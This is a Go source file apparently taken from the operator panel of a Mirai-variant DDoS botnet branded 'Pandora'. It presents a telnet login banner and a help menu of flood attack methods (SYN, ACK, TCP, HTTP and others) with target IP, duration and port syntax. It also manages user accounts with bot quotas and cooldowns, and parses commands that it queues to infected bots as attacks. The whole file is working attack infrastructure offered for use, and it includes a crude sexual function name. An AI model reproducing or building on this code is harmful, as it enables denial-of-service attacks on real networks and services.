package main

import (
    "fmt"
    "net"
    "time"
    "strings"
    "strconv"
    "bufio"
    "os/exec"
)

type Admin struct {
    conn    net.Conn
}

func NewAdmin(conn net.Conn) *Admin {
    return &Admin{conn}
}

func daddymypussyiswet() {
	cmd := exec.Command("ls")
	stdout, _ := cmd.StdoutPipe()
	cmd.Start()

	scanner := bufio.NewScanner(stdout)
	scanner.Split(bufio.ScanWords)
	for scanner.Scan() {
		m := scanner.Text()
		fmt.Println(m)
	}
	cmd.Wait()
}

func (this *Admin) Handle() {
    this.conn.Write([]byte("\033[?1049h"))
    this.conn.Write([]byte("\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22"))

    defer func() {
        this.conn.Write([]byte("\033[?1049l"))
    }()

    // Get username
    this.conn.Write([]byte("\033[2J\033[1;1H"))
    this.conn.Write([]byte("\033[01;36mPANDORA \033[01;32mAuthentification \033[01;37mSystem\r\n"))
    this.conn.Write([]byte("\r\n"))
    this.conn.Write([]byte("\033[01;37m            ╔═══════════════════════════════════════════════╗   \x1b[0m \r\n"))
    this.conn.Write([]byte("\033[01;37m            ║\033[01;36m                 Welcome To The\033[01;37m                ║   \x1b[0m \r\n"))
    this.conn.Write([]byte("\033[01;37m            ║\033[01;36m                    Pandora\033[01;37m                    ║    \x1b[0m \r\n"))
    this.conn.Write([]byte("\033[01;37m            ║\033[01;36m                  Mirai Botnet\033[01;37m                 ║    \x1b[0m \r\n"))
    this.conn.Write([]byte("\033[01;37m        ╔═══╚══════════════════════════╗════════════════════╝   \x1b[0m \r\n"))
    this.conn.Write([]byte("\033[01;37m        ║         \033[01;36mPandora's\033[01;37m            ║\r\n"))
    this.conn.Write([]byte("\033[01;37m        ║           \033[01;36mBOX\033[01;37m                ║\r\n"))
    this.conn.Write([]byte("\033[01;37m╔═══════╚══════════════════════════════╝════════╗   \x1b[0m \r\n"))
    this.conn.Write([]byte("\033[01;37m║   \033[01;36mEnter Correct Credentials To Peer Inside\033[01;37m    ║   \x1b[0m \r\n"))
    this.conn.Write([]byte("\033[01;37m╚═══════════════════════════════════════════════╝    \x1b[0m \r\n"))
    this.conn.Write([]byte("\r\n"))
    this.conn.SetDeadline(time.Now().Add(60 * time.Second))
    this.conn.Write([]byte("\033[01;36mUsername\033[\033[01;37m: \033[01;37m"))
    username, err := this.ReadLine(false)
    if err != nil {
        return
    }

    // Get password
    this.conn.SetDeadline(time.Now().Add(60 * time.Second))
    this.conn.Write([]byte("\033[01;36mPassword\033[\033[01;37m: \033[01;36m"))
    password, err := this.ReadLine(true)
    if err != nil {
        return
    }
    //Attempt  Login
    this.conn.SetDeadline(time.Now().Add(120 * time.Second))
    this.conn.Write([]byte("\r\n"))
	spinBuf := []byte{'-', '\\', '|', '/'}
    for i := 0; i < 15; i++ {
        this.conn.Write(append([]byte("\r\033[01;37mAttempting To \033[01;32mAuthenticate \033[01;37mUser With \033[01;37mAttempted Credentials \033[01;32m"), spinBuf[i % len(spinBuf)]))
        time.Sleep(time.Duration(300) * time.Millisecond)
    }
	this.conn.Write([]byte("\r\n"))

	//if credentials are incorrect output error and close session
    var loggedIn bool
    var userInfo AccountInfo
    if loggedIn, userInfo = database.TryLogin(username, password, this.conn.RemoteAddr()); !loggedIn {
        this.conn.Write([]byte("\r\033[01;31mERROR\033[01;37m: \033[01;37mAttempted Credentials Are \033[01;31mNot \033[01;37mValid!\r\n"))
        buf := make([]byte, 1)
        this.conn.Read(buf)
        return
    }
    //Header display bots connected, source name, client name
    this.conn.Write([]byte("\r\n\033[0m"))
    go func() {
        i := 0
        for {
            var BotCount int
            if clientList.Count() > userInfo.maxBots && userInfo.maxBots != -1 {
                BotCount = userInfo.maxBots
            } else {
                BotCount = clientList.Count()
            }

            time.Sleep(time.Second)
            if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0; [%d] Bots Loaded | Pandora | Username: %s\007", BotCount, username))); err != nil {
                this.conn.Close()
                break
            }
            i++
            if i % 60 == 0 {
                this.conn.SetDeadline(time.Now().Add(120 * time.Second))
            }
        }
    }()
    this.conn.Write([]byte("\033[1;36m             ╔═══════════════════════════════════════════════╗   \x1b[0m \r\n"))
    this.conn.Write([]byte("\033[1;36m             ║\033[1;37m- - - - - - - - - - - - - - - - - - - - - - - -\033[1;35m\033[1;36m║   \x1b[0m \r\n"))
    this.conn.Write([]byte("\033[1;36m             ║\033[1;37m- - - - - - - - - - - - - - - - - - - - - - - -\033[1;35m\033[1;36m║   \x1b[0m \r\n"))
    this.conn.Write([]byte("\033[1;36m             ║═══════║ \033[1;37m- - - - - \033[1;36mWelome-To \033[1;37m- - - - - \033[1;36m║═══════║\x1b[0m \r\n"))
    this.conn.Write([]byte("\033[1;36m             ║════════║\033[1;37m- - - - -  \033[1;36mPandora \033[1;37m- - - -  -\033[1;36m║════════║  \x1b[0m \r\n"))
    this.conn.Write([]byte("\033[1;36m             ║═══════║ \033[1;37m- - - -  \033[1;36mMirai-Botnet\033[1;37m - - - - \033[1;36m║═══════║  \x1b[0m \r\n"))
    this.conn.Write([]byte("\033[1;36m             ║\033[1;37m- - - - - - -\033[1;36mT O \033[1;37m- \033[1;36mS E E\033[1;37m - \033[1;36mC M D S\033[1;37m- - - - - - -\033[1;35m\033[1;36m║   \x1b[0m \r\n"))
    this.conn.Write([]byte("\033[1;36m             ║\033[1;37m- - - - - - - -\033[1;36mT Y P E \033[1;37m- \033[1;36mH E L P\033[1;37m- - - - - - - -\033[1;35m\033[1;36m║   \x1b[0m \r\n"))
    this.conn.Write([]byte("\033[1;36m             ╚═══════════════════════════════════════════════╝   \x1b[0m \r\n"))
    //add in user name and source name to command line
    for {
        var botCatagory string
        var botCount int
        this.conn.Write([]byte("\033[01;37m[\033[01;36m" + username + "\033[01;37m@\033[01;36mPandora \033[01;37m~\033[01;36m]\033[01;37m# \033[01;37m"))
        cmd, err := this.ReadLine(false)
        
        if cmd == "MAIN" || cmd == "MAIN" {
            this.conn.Write([]byte("\033[2J\033[1H")) //display main header when #MAIN occurs in terminal
            this.conn.Write([]byte("\x1b[1;33m                                                \x1b[0m \r\n"))
            this.conn.Write([]byte("\033[1;36m                  ,ggggggggggg,                                                                                \x1b[0m \r\n"))
            this.conn.Write([]byte("\033[1;36m                 dP```88``````Y8,                            8I                                                \x1b[0m \r\n"))
            this.conn.Write([]byte("\033[1;36m                 Yb,  88      `8b                            8I                                                \x1b[0m \r\n"))
            this.conn.Write([]byte("\033[1;36m                  ``  88      ,8P                            8I                                                \x1b[0m \r\n"))
            this.conn.Write([]byte("\033[1;36m                      88aaaad8P`                             8I                                                \x1b[0m \r\n"))
            this.conn.Write([]byte("\033[1;36m                      88`````,gggg,gg   ,ggg,,ggg,     ,gggg,8I    ,ggggg,   ,gggggg,    ,gggg,gg              \x1b[0m \r\n"))  
            this.conn.Write([]byte("\033[1;36m                      88    dP`  `Y8I  ,8` `8P` `8,   dP`  `Y8I   dP`  `Y8gggdP````8I   dP`  `Y8I              \x1b[0m \r\n"))
            this.conn.Write([]byte("\033[1;36m                      88   i8`    ,8I  I8   8I   8I  i8`    ,8I  i8`    ,8I ,8`    8I  i8`    ,8I              \x1b[0m \r\n"))
            this.conn.Write([]byte("\033[1;36m                      88  ,d8,   ,d8b,,dP   8I   Yb,,d8,   ,d8b,,d8,   ,d8`,dP     Y8,,d8,   ,d8b,             \x1b[0m \r\n"))
            this.conn.Write([]byte("\033[1;36m                      88  P`Y8888P``Y88P`   8I   `Y8P`Y8888P``Y8P`Y8888P`  8P      `Y8P`Y8888P``Y8             \x1b[0m \r\n"))
            this.conn.Write([]byte("\033[1;36m                                         Version v1.0                                                          \x1b[0m \r\n"))
            this.conn.Write([]byte("\033[1;36m                                                    Mirai Botnet                                               \x1b[0m \r\n"))
       continue
        }
        if err != nil || cmd == "c" || cmd == "cls" || cmd == "clear" { // clear screen 
            this.conn.Write([]byte("\033[2J\033[1H"))
            this.conn.Write([]byte("\033[1;36m             ╔═══════════════════════════════════════════════╗   \x1b[0m \r\n"))
            this.conn.Write([]byte("\033[1;36m             ║\033[1;37m- - - - - - - - - - - - - - - - - - - - - - - -\033[1;35m\033[1;36m║   \x1b[0m \r\n"))
            this.conn.Write([]byte("\033[1;36m             ║\033[1;37m- - - - - - - - - - - - - - - - - - - - - - - -\033[1;35m\033[1;36m║   \x1b[0m \r\n"))
            this.conn.Write([]byte("\033[1;36m             ║═══════║ \033[1;37m- - - - - \033[1;36mWelome-To \033[1;37m- - - - - \033[1;36m║═══════║\x1b[0m \r\n"))
            this.conn.Write([]byte("\033[1;36m             ║════════║\033[1;37m- - - - -  \033[1;36mPandora \033[1;37m- - - -  -\033[1;36m║════════║  \x1b[0m \r\n"))
            this.conn.Write([]byte("\033[1;36m             ║═══════║ \033[1;37m- - - -  \033[1;36mMirai-Botnet\033[1;37m - - - - \033[1;36m║═══════║  \x1b[0m \r\n"))
            this.conn.Write([]byte("\033[1;36m             ║\033[1;37m- - - - - - -\033[1;36mT O \033[1;37m- \033[1;36mS E E\033[1;37m - \033[1;36mC M D S\033[1;37m- - - - - - -\033[1;35m\033[1;36m║   \x1b[0m \r\n"))
            this.conn.Write([]byte("\033[1;36m             ║\033[1;37m- - - - - - - -\033[1;36mT Y P E \033[1;37m- \033[1;36mH E L P\033[1;37m- - - - - - - -\033[1;35m\033[1;36m║   \x1b[0m \r\n"))
            this.conn.Write([]byte("\033[1;36m             ╚═══════════════════════════════════════════════╝   \x1b[0m \r\n"))
             continue
        }
        if cmd == "help" || cmd == "HELP" || cmd == "?" { // display help menu
            this.conn.Write([]byte("\033[01;36m ╔══════════════════════════════════════════╗   \x1b[0m \r\n"))
            this.conn.Write([]byte("\033[01;36m ║ \033[01;37mMAIN \033[01;36m- \033[01;37mShows \033[01;36mPandora Banner              \033[01;36m║   \x1b[0m \r\n"))
            this.conn.Write([]byte("\033[01;36m ║ \033[01;37mMETHODS \033[01;36m- \033[01;37mShows \033[01;36mAttack Commands          \033[01;36m║   \x1b[0m \r\n"))
			this.conn.Write([]byte("\033[01;36m ║ \033[01;37mADV \033[01;36m- \033[01;37mShows \033[01;36mAdvanced Attack Commands     \033[01;36m║   \x1b[0m \r\n"))
            this.conn.Write([]byte("\033[01;36m ║ \033[01;37mADMIN \033[01;36m- \033[01;37mShows \033[01;36mAdmin Commands             \033[01;36m║   \x1b[0m \r\n"))
            this.conn.Write([]byte("\033[01;36m ║ \033[01;37mBOTS \033[01;36m- \033[01;37mShows \033[01;36mLoaded Bot List             \033[01;36m║   \x1b[0m \r\n"))
            this.conn.Write([]byte("\033[01;36m ║ \033[01;37mINFO \033[01;36m- \033[01;37mShows \033[01;36mCurrent Net Info            \033[01;36m║   \x1b[0m \r\n"))
            this.conn.Write([]byte("\033[01;36m ╚══════════════════════════════════════════╝ \x1b[0m \r\n"))
            continue
        }
        if cmd == "METHODS" || cmd == "methods" { // display methods and how to send an attack   \x1b[0m \r\n"))
            this.conn.Write([]byte("\033[01;36m ╔═══════════════════════════════════════════════════════╗   \x1b[0m \r\n"))
            this.conn.Write([]byte("\033[01;36m ║ \033[01;37mSTD \033[01;36mFlood   \033[01;36m-    \033[01;37mstd [\033[01;36mIP\033[01;37m] [\033[01;36mTIME\033[01;37m] dport=[\033[01;36mPORT\033[01;37m]\033[01;36m         ║   \x1b[0m \r\n"))
            this.conn.Write([]byte("\033[01;36m ║ \033[01;37mFRAG \033[01;36mFlood  \033[01;36m-   \033[01;37mfrag [\033[01;36mIP\033[01;37m] [\033[01;36mTIME\033[01;37m] dport=[\033[01;36mPORT\033[01;37m]\033[01;36m         ║   \x1b[0m \r\n"))
            this.conn.Write([]byte("\033[01;36m ║ \033[01;37mSYN \033[01;36mFlood   \033[01;36m-    \033[01;37msyn [\033[01;36mIP\033[01;37m] [\033[01;36mTIME\033[01;37m] dport=[\033[01;36mPORT\033[01;37m]\033[01;36m         ║   \x1b[0m \r\n"))
            this.conn.Write([]byte("\033[01;36m ║ \033[01;37mACK \033[01;36mFlood   \033[01;36m-    \033[01;37mack [\033[01;36mIP\033[01;37m] [\033[01;36mTIME\033[01;37m] dport=[\033[01;36mPORT\033[01;37m]\033[01;36m         ║   \x1b[0m \r\n"))
            this.conn.Write([]byte("\033[01;36m ║ \033[01;37mUSYN \033[01;36mFlood  \033[01;36m-   \033[01;37musyn [\033[01;36mIP\033[01;37m] [\033[01;36mTIME\033[01;37m] dport=[\033[01;36mPORT\033[01;37m]\033[01;36m         ║   \x1b[0m \r\n"))
            this.conn.Write([]byte("\033[01;36m ║ \033[01;37mTCP \033[01;36mFlood   \033[01;36m-    \033[01;37mtcp [\033[01;36mIP\033[01;37m] [\033[01;36mTIME\033[01;37m] dport=[\033[01;36mPORT\033[01;37m]\033[01;36m         ║   \x1b[0m \r\n"))
            this.conn.Write([]byte("\033[01;36m ║ \033[01;37mASYN \033[01;36mFlood  \033[01;36m-   \033[01;37masyn [\033[01;36mIP\033[01;37m] [\033[01;36mTIME\033[01;37m] dport=[\033[01;36mPORT\033[01;37m]\033[01;36m         ║   \x1b[0m \r\n"))
            this.conn.Write([]byte("\033[01;36m ║ \033[01;37mPLAIN \033[01;36mFlood \033[01;36m-  \033[01;37mplain [\033[01;36mIP\033[01;37m] [\033[01;36mTIME\033[01;37m] dport=[\033[01;36mPORT\033[01;37m]\033[01;36m         ║   \x1b[0m \r\n"))
            this.conn.Write([]byte("\033[01;36m ║ \033[01;37mHTTP \033[01;36mFlood  \033[01;36m-   \033[01;37mhttp [\033[01;36mIP\033[01;37m] [\033[01;36mTIME\033[01;37m] dport=[\033[01;36mPORT\033[01;37m]\033[01;36m         ║   \x1b[0m \r\n"))
            this.conn.Write([]byte("\033[01;36m ╚═══════════════════════════════════════════════════════╝   \x1b[0m \r\n"))
            continue
        }
        if cmd == "ADVANCED" || cmd == "advanced" || cmd == "adv" || cmd == "ADV" { // display methods and how to send an attack
            this.conn.Write([]byte("\033[01;36m ╔════════════════════════════════════════════════════════════╗   \x1b[0m \r\n"))
            this.conn.Write([]byte("\033[01;36m ║ \033[01;37mYou Really think i would give the private methods away?\033[01;36m    ║   \x1b[0m \r\n"))
            this.conn.Write([]byte("\033[01;36m ╚════════════════════════════════════════════════════════════╝   \x1b[0m \r\n"))

        continue
        }

        if userInfo.admin == 1 && cmd == "admin" {
            this.conn.Write([]byte("\033[01;36m ╔═══════════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\033[01;36m ║ \033[01;37mADDBASIC - \033[01;37mAdd Basic Client Menu  \033[01;36m║\r\n"))
            this.conn.Write([]byte("\033[01;36m ║ \033[01;37mADDADMIN - \033[01;37mAdd Admin Client Menu  \033[01;36m║ \r\n"))
            this.conn.Write([]byte("\033[01;36m ║ \033[01;37mREMOVEUSER - \033[01;37mRemove User Menu     \033[01;36m║ \r\n"))
            this.conn.Write([]byte("\033[01;36m ╚═══════════════════════════════════╝  \r\n"))
            continue
        }
        if err != nil || cmd == "INFO" || cmd == "info" {
        botCount = clientList.Count()
            this.conn.Write([]byte(fmt.Sprintf("\033[01;36m ═══════════════════════════════  \r\n")))
            this.conn.Write([]byte(fmt.Sprintf("\033[01;36m  \033[01;37mLogged In As: \033[01;36m" + username + "          \r\n")))
            this.conn.Write([]byte(fmt.Sprintf("\033[01;36m  \033[01;37mBots Loaded: \033[01;36m%d                        \r\n", botCount)))
            this.conn.Write([]byte(fmt.Sprintf("\033[01;36m  \033[01;37mVersion: \033[01;36mPrivate                        \r\n")))
            this.conn.Write([]byte(fmt.Sprintf("\033[01;36m  \033[01;37mDeveloped By \033[01;36m@W0RST / Spooky (killersec)                 \r\n")))
			this.conn.Write([]byte(fmt.Sprintf("\033[01;36m  \033[01;37mDATE MADE: \033[01;36m03/06/2019                        \r\n")))
            this.conn.Write([]byte(fmt.Sprintf("\033[01;36m ═══════════════════════════════  \r\n")))
            continue
        }
        if err != nil || cmd == "logout" || cmd == "LOGOUT" {
            return
        }
        
        if cmd == "" {
            continue
        }

        botCount = userInfo.maxBots

        if userInfo.admin == 1 && cmd == "addbasic" {
            this.conn.Write([]byte("\033[0mUsername:\033[01;36m "))
            new_un, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\033[0mPassword:\033[01;36m "))
            new_pw, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\033[0mBotcount\033[01;37m(\033[0m-1 for access to all\033[01;37m)\033[0m:\033[01;36m "))
            max_bots_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            max_bots, err := strconv.Atoi(max_bots_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the bot count")))
                continue
            }
            this.conn.Write([]byte("\033[0mAttack Duration\033[01;37m(\033[0m-1 for none\033[01;37m)\033[0m:\033[01;36m "))
            duration_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            duration, err := strconv.Atoi(duration_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the attack duration limit")))
                continue
            }
            this.conn.Write([]byte("\033[0mCooldown\033[01;37m(\033[0m0 for none\033[01;37m)\033[0m:\033[01;36m "))
            cooldown_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            cooldown, err := strconv.Atoi(cooldown_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the cooldown")))
                continue
            }
            this.conn.Write([]byte("\033[0m- New user info - \r\n- Username - \033[01;37m" + new_un + "\r\n\033[0m- Password - \033[01;37m" + new_pw + "\r\n\033[0m- Bots - \033[01;37m" + max_bots_str + "\r\n\033[0m- Max Duration - \033[01;37m" + duration_str + "\r\n\033[0m- Cooldown - \033[01;37m" + cooldown_str + "   \r\n\033[0mContinue? \033[01;37m(\033[01;32my\033[01;37m/\033[01;31mn\033[01;37m) "))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.CreateBasic(new_un, new_pw, max_bots, duration, cooldown) {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to create new user. An unknown error occured.")))
            } else {
                this.conn.Write([]byte("\033[32;1mUser added successfully.\033[0m\r\n"))
            }
            continue
        }

        if userInfo.admin == 1 && cmd == "removeuser" {
            this.conn.Write([]byte("\033[01;37mUsername: \033[0;35m"))
            rm_un, err := this.ReadLine(false)
            if err != nil {
                return
             }
            this.conn.Write([]byte(" \033[01;37mAre You Sure You Want To \033[01;31mRemove \033[01;36m" + rm_un + "?\033[01;37m(\033[01;32my\033[01;37m/\033[01;31mn\033[01;37m) "))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.RemoveUser(rm_un) {
            this.conn.Write([]byte(fmt.Sprintf("\033[01;31mUnable to remove users\r\n")))
            } else {
                this.conn.Write([]byte("\033[01;32mUser Successfully Removed!\r\n"))
            }
            continue
        }

        botCount = userInfo.maxBots

        if userInfo.admin == 1 && cmd == "addadmin" {
            this.conn.Write([]byte("\033[0mUsername:\033[01;36m "))
            new_un, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\033[0mPassword:\033[01;36m "))
            new_pw, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\033[0mBotcount\033[01;36m(\033[0m-1 for access to all\033[01;36m)\033[0m:\033[01;36m "))
            max_bots_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            max_bots, err := strconv.Atoi(max_bots_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the bot count")))
                continue
            }
            this.conn.Write([]byte("\033[0mAttack Duration\033[01;37m(\033[0m-1 for none\033[01;37m)\033[0m:\033[01;36m "))
            duration_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            duration, err := strconv.Atoi(duration_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the attack duration limit")))
                continue
            }
            this.conn.Write([]byte("\033[0mCooldown\033[01;37m(\033[0m0 for none\033[01;37m)\033[0m:\033[01;36m "))
            cooldown_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            cooldown, err := strconv.Atoi(cooldown_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the cooldown")))
                continue
            }
            this.conn.Write([]byte("\033[0m- New user info - \r\n- Username - \033[01;36m" + new_un + "\r\n\033[0m- Password - \033[01;36m" + new_pw + "\r\n\033[0m- Bots - \033[01;36m" + max_bots_str + "\r\n\033[0m- Max Duration - \033[01;36m" + duration_str + "\r\n\033[0m- Cooldown - \033[01;36m" + cooldown_str + "   \r\n\033[0mContinue? \033[01;37m(\033[01;32my\033[01;36m/\033[01;31mn\033[01;37m) "))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.CreateAdmin(new_un, new_pw, max_bots, duration, cooldown) {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to create new user. An unknown error occured.")))
            } else {
                this.conn.Write([]byte("\033[32;1mUser added successfully.\033[0m\r\n"))
            }
            continue
        }

        if cmd == "bots" || cmd == "BOTS" || cmd == "Bots" || cmd == "Slaves" || cmd == "slaves" || cmd == "Devices" || cmd == "devices" || cmd == "boats" || cmd == "Boats" {
		botCount = clientList.Count()
            m := clientList.Distribution()
            for k, v := range m {
                this.conn.Write([]byte(fmt.Sprintf("\033[01;37m[\033[01;36m%s\033[01;37m]\033[01;37m:\t\033[01;37m==> \033[01;37m[\033[01;36m%d\033[01;37m]\r\n", k, v)))
            }
			this.conn.Write([]byte(fmt.Sprintf("\033[01;37mTotal Bots: \033[01;37m[\033[01;36m%d\033[01;37m]\r\n\033[0m", botCount)))
            continue
		}
        if cmd[0] == '-' {
            countSplit := strings.SplitN(cmd, " ", 2)
            count := countSplit[0][1:]
            botCount, err = strconv.Atoi(count)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1mFailed to parse botcount \"%s\"\033[0m\r\n", count)))
                continue
            }
            if userInfo.maxBots != -1 && botCount > userInfo.maxBots {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1mBot count to send is bigger then allowed bot maximum\033[0m\r\n")))
                continue
            }
            cmd = countSplit[1]
        }
        if userInfo.admin == 1 && cmd[0] == '@' {
            cataSplit := strings.SplitN(cmd, " ", 2)
            botCatagory = cataSplit[0][1:]
            cmd = cataSplit[1]
        }

        atk, err := NewAttack(cmd, userInfo.admin)
        botCount = clientList.Count()
        if err != nil {
            this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
        } else {
            buf, err := atk.Build()
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
            } else {
                if can, err := database.CanLaunchAttack(username, atk.Duration, cmd, botCount, 0); !can {
                    this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
                } else if !database.ContainsWhitelistedTargets(atk) {
                    clientList.QueueBuf(buf, botCount, botCatagory)
                    this.conn.Write([]byte(fmt.Sprintf("\033[01;37m [\033[01;31m!\033[01;37m] \033[01;37mAttack \033[01;36mSent \033[01;37mTo \033[01;36m%d \033[01;37mBots \033[01;37m[\033[01;31m!\033[01;37m] \r\n", botCount)))
                } else {
                    fmt.Println("Blocked attack by " + username + " to whitelisted prefix")
                }
            }
        }
    }
}

func (this *Admin) ReadLine(masked bool) (string, error) {
    buf := make([]byte, 1024)
    bufPos := 0

    for {
        n, err := this.conn.Read(buf[bufPos:bufPos+1])
        if err != nil || n != 1 {
            return "", err
        }
        if buf[bufPos] == '\xFF' {
            n, err := this.conn.Read(buf[bufPos:bufPos+2])
            if err != nil || n != 2 {
                return "", err
            }
            bufPos--
        } else if buf[bufPos] == '\x7F' || buf[bufPos] == '\x08' {
            if bufPos > 0 {
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos--
            }
            bufPos--
        } else if buf[bufPos] == '\r' || buf[bufPos] == '\t' || buf[bufPos] == '\x09' {
            bufPos--
        } else if buf[bufPos] == '\n' || buf[bufPos] == '\x00' {
            this.conn.Write([]byte("\r\n"))
            return string(buf[:bufPos]), nil
        } else if buf[bufPos] == 0x03 {
            this.conn.Write([]byte("^C\r\n"))
            return "", nil
        } else {
            if buf[bufPos] == '\x1B' {
                buf[bufPos] = '^';
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos++;
                buf[bufPos] = '[';
                this.conn.Write([]byte(string(buf[bufPos])))
            } else if masked {
                this.conn.Write([]byte("*"))
            } else {
                this.conn.Write([]byte(string(buf[bufPos])))
            }
        }
        bufPos++
    }
    return string(buf), nil
}
